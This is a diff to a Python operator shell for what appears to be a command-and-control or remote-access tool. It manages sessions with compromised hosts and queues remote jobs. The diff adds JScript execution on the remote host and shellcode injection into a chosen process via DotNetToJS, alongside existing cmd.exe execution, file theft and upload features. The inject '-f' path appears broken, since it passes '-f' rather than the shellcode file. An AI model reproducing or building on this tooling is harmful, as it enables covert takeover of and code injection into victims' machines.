@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 # coding:utf-8
-from prompt_toolkit import PromptSession
 import shlex
+import os
+from prompt_toolkit import PromptSession
 from .color import BOLD
+from .log import Log
 
 
 class Shell():
@@ -20,6 +22,7 @@ class Shell():
                       'netstat': 'netstat ',
                       'whoami': 'whoami /user',
                       'net': 'net ',
+                      'wimc': 'wimc ',
                       }
 
     def __show_alias(self):
@@ -29,110 +32,186 @@ class Shell():
 
     def __print_session_help(self):
         print('Usage:')
-        print('{}{}: list all sessions'.format(' '*8, BOLD('sessions | s')))
-        print('{}{} [sessionID]: interactive cmd with sessionID'.format(
-            ' '*8, BOLD('sessions | s -i')))
-        print('{}{} [sessionID]: show one session detail'.format(
-            ' '*8, BOLD('sessions | s -v')))
-        print('{}{} [sessionID]: remove one session'.format(
-            ' '*8, BOLD('sessions | s -r')))
-        print('{}{}: exit'.format(' '*8, BOLD('exit/quit')))
+        print('\t{}: list all sessions'.format(BOLD('sessions | s')))
+        print('\t{} [sessionID]: interactive cmd with sessionID'.format(
+            BOLD('sessions | s -i')))
+        print('\t{} [sessionID]: show one session detail'.format(
+            BOLD('sessions | s -v')))
+        print('\t{} [sessionID]: remove one session'.format(
+            BOLD('sessions | s -r')))
+        print('\t{}: exit'.format(BOLD('exit/quit')))
 
     def __print_cmd_help(self):
         print('Usage:')
-        print('{}{}: get system info'.format(' '*8, BOLD('info')))
-        print('{}{} [seconds]: set sleep time'.format(
-            ' '*8, BOLD('sleep')))
-        print('{}{} [cmd]: execute shell command'.format(
-            ' '*8, BOLD('shell')))
-        print('{}{} [cmd]: run program and return'.format(
-            ' '*8, BOLD('run')))
-        print('{}{} [path_file]: show remote file context'.format(
-            ' '*8, BOLD('cat')))
-        print('{}{} [local_file] [remote_file]: upload file'.format(
-            ' '*8, BOLD('upload')))
-        print('{}{} [local_file] [remote_file]: download file'.format(
-            ' '*8, BOLD('download')))
-        print('{}{}: show shell alias name'.format(' '*8, BOLD('alias')))
-        print('{}{}: exit current session'.format(' '*8, BOLD('back')))
+        print('\t{}: get system info'.format(BOLD('info')))
+        print('\t{} [seconds]: set sleep time'.format(
+            BOLD('sleep')))
+        print('\t{} [cmd]: execute shell command'.format(
+            BOLD('shell')))
+        print('\t{} [cmd]: run program and return'.format(
+            BOLD('run')))
+        print('\t{} [path_file]: show remote file context'.format(
+            BOLD('cat')))
+        print('\t{} [local_file] [remote_file]: upload file'.format(
+            BOLD('upload')))
+        print('\t{} [local_file] [remote_file]: download file'.format(
+            BOLD('download')))
+        print('\t{} [local_pathname]: run jscript file in remote host'.format(
+            BOLD('js run')))
+        print('\t{} [base64_shellcode | -f shellcode_raw_file] [pid]: inject shellcode  by DotNetToJS\n\t\t(shellcode is bas64encoded or raw file)'.format(BOLD('inject')))
+        print('\t{}: show session jobs'.format(BOLD('jobs')))
+        print('\t{}: show shell alias name'.format(BOLD('alias')))
+        print('\t{}: exit current session'.format(BOLD('back')))
+
+    '''
+    执行文件上传、下载命令
+    '''
+
+    def __parse_cmd_upload_download(self, action, text):
+        args_commands = shlex.split(text)
+        if len(args_commands) != 3:
+            print(
+                'usage:{} [local_pathname] [remote_pathname[]'.format(action))
+        else:
+            if action == 'upload' and not os.path.exists(args_commands[1]):
+                print('file {} not exist!'.format(args_commands[1]))
+            else:
+                self.CMD_SESSION['job'].add_job(
+                    action, local_pathname=args_commands[1], remote_pathname=args_commands[2])
+
+    '''
+    执行运行jscript命令
+    '''
+
+    def __parse_cmd_js_run(self, action, text):
+        args_commands = shlex.split(text)
+        if len(args_commands) == 3 and args_commands[1] == 'run':
+            if not os.path.exists(args_commands[2]):
+                print('file {} not exist!'.format(args_commands[2]))
+            else:
+                self.CMD_SESSION['job'].add_job(
+                    action, local_pathname=args_commands[2])
+        else:
+            print('usage:{} run [local_pathname]'.format(action))
+
+    '''
+    执行注入命令
+    '''
+
+    def __parse_cmd_inject(self, action, text):
+        args_commands = shlex.split(text)
+        if len(args_commands) == 1:
+            print(
+                'usage:inject [base64_shellcode | -f shellcode_raw_file] [pid]')
+        else:
+            # shellcode位于文件中
+            if args_commands[1] == '-f':
+                if len(args_commands) <= 2:
+                    print(
+                        'usage:inject -f [shellcode_raw_file] [pid]')
+                else:
+                    if not os.path.exists(args_commands[2]):
+                        print('file {} not exists'.format(
+                            args_commands[2]))
+                    else:
+                        shellcode = args_commands[2]
+                        pid = args_commands[3] if len(
+                            args_commands) > 3 else '0'
+                        self.CMD_SESSION['job'].add_job(
+                            action, shellcode=args_commands[1], pid=pid)
+            # shellcode是base64编码
+            else:
+                shellcode = args_commands[1]
+                pid = args_commands[2] if len(args_commands) > 2 else '0'
+                self.CMD_SESSION['job'].add_job(
+                    action, shellcode=args_commands[1], pid=pid)
 
     '''
     交互式执行命令
     '''
 
     def parse_cmd(self, commands, action, args, text):
-        if not self.CMD_SESSION:
-            return True
-
-        if action == 'help':
-            self.__print_cmd_help()
-        elif action == 'back' or action == 'exit' or action == 'quit':
+        if not self.CMD_SESSION or action == 'back' or action == 'exit' or action == 'quit':
             self.CMD_SESSION = None
             self.PROMPT_MSG = '>'
+        elif action == 'help':
+            self.__print_cmd_help()
         elif action == 'alias':
             self.__show_alias()
         elif action == 'info':
             self.CMD_SESSION['job'].add_job(action)
+        # 设置sleep时间
         elif action == 'sleep' and len(commands) == 2:
             try:
                 self.CMD_SESSION['job'].add_job(
                     'sleep', sleep=str(int(commands[1])))
             except Exception as ex:
                 print('[-]{}'.format(ex))
+        # 执行shell命令
         elif action == 'shell':
             self.CMD_SESSION['job'].add_job(
                 'shell', cmd='cmd.exe /c {}'.format(args))
+        # 在远程主机上运行程序
         elif action == 'run':
             self.CMD_SESSION['job'].add_job(action, cmd=args)
+        # 显示远程主机文本内容
         elif action == 'cat':
-            self.CMD_SESSION['job'].add_job(action, file_pathname=args)
+            self.CMD_SESSION['job'].add_job(action, remote_pathname=args)
+        # 上传和下载
         elif action == 'upload' or action == 'download':
-            args_upload = shlex.split(text)
-            if len(args_upload) != 3:
-                print('usage:{} local_pathname remote_pathname'.format(action))
-            else:
-                self.CMD_SESSION['job'].add_job(
-                    action, local_pathname=args_upload[1], remote_pathname=args_upload[2])
+            self.__parse_cmd_upload_download(action, text)
         elif action in self.alias:
             self.CMD_SESSION['job'].add_job(
                 'shell', cmd='cmd.exe /c {} {}'.format(self.alias.get(action), args))
+        # 加载jscript脚本运行
+        elif action == 'js':
+            self.__parse_cmd_js_run(action, text)
+        # shellcode 注入
+        elif action == 'inject':
+            self.__parse_cmd_inject(action, text)
+        # 显示当前session的所有任务
+        elif action == 'jobs':
+            self.CMD_SESSION['job'].list_jobs()
 
-        return True
-    
+    '''
+    session命令
+    '''
+
+    def __parse_session_s(self, commands, args):
+        if len(commands) < 3:
+            self.session.list_sessions()
+            return
+        s = self.session.get_session(int(commands[2]))
+        if not s:
+            return
+        if commands[1] == '-i':
+            # 与指定SID进行交互式命令
+            self.CMD_SESSION = s
+            self.PROMPT_MSG = '{}(SID:{}) >'.format(
+                s['client_ip'], s['id'])
+        elif commands[1] == '-v':
+            # 显示一个SID的详细情况
+            self.session.show_session_detail(int(commands[2]))
+        elif commands[1] == '-k':
+            # KILL SID
+            confirm = self.input.prompt(
+                'Confirm Kill Session:YES(y)/No(enter)?')
+            if confirm == 'y':
+                s['job'].add_job('kill')
+        elif commands[1] == '-r':
+            # 移除SID
+            confirm = self.input.prompt(
+                'Confirm Remove Session:YES(y)/No(enter)?')
+            if confirm == 'y':
+                self.session.remove_session(int(commands[2]))
+
     '''
     session管理
     '''
 
     def parse_session(self, commands, action, args):
         if action == 'sessions' or action == 's':
-            if len(commands) == 3:
-                if commands[1] == '-i':
-                    # 与指定SID进行交互式命令
-                    s = self.session.get_session(int(commands[2]))
-                    if s:
-                        self.CMD_SESSION = s
-                        self.PROMPT_MSG = '{}(SID:{}) >'.format(
-                            s['client_ip'], s['id'])
-                elif commands[1] == '-v':
-                    # 显示一个SID的详细情况
-                    self.session.show_session_detail(int(commands[2]))
-                elif commands[1] == '-k':
-                    # KILLSID
-                    confirm = self.input.prompt(
-                        'Confirm Kill Session:YES(y)/No(enter)?')
-                    if confirm == 'y':
-                        s = self.session.get_session(int(commands[2]))
-                        if s:
-                            s['job'].add_job('kill')
-                elif commands[1] == '-r':
-                    # 移除SID
-                    confirm = self.input.prompt(
-                        'Confirm Remove Session:YES(y)/No(enter)?')
-                    if confirm == 'y':
-                        self.session.remove_session(int(commands[2]))
-            else:
-                # 显示所有sessions
-                self.session.list_sessions()
+            self.__parse_session_s(commands, args)
         elif action == 'help':
             self.__print_session_help()
         elif action == 'exit' or action == 'quit':
@@ -148,6 +227,8 @@ class Shell():
     def get_command(self):
         try:
             text = self.input.prompt(self.PROMPT_MSG)
+            if text.strip():
+                Log.log_message(text, log_type=Log.CMD, output=False)
         except KeyboardInterrupt:
             confirm = self.input.prompt('Confirm Exit:YES(y)/No(enter)?')
             return False if confirm == 'y' else True
@@ -162,11 +243,11 @@ class Shell():
         action = commands[0].strip()
         args = ' '.join([commands[x] for x in range(1, len(commands))])
 
-        if not self.CMD_SESSION:
-            # 解析session管理
-            return self.parse_session(commands, action, args)
-        else:
+        if self.CMD_SESSION:
             # 解析交互式命令
             self.parse_cmd(commands, action, args, text)
+        else:
+            # 解析session管理
+            return self.parse_session(commands, action, args)
 
         return True
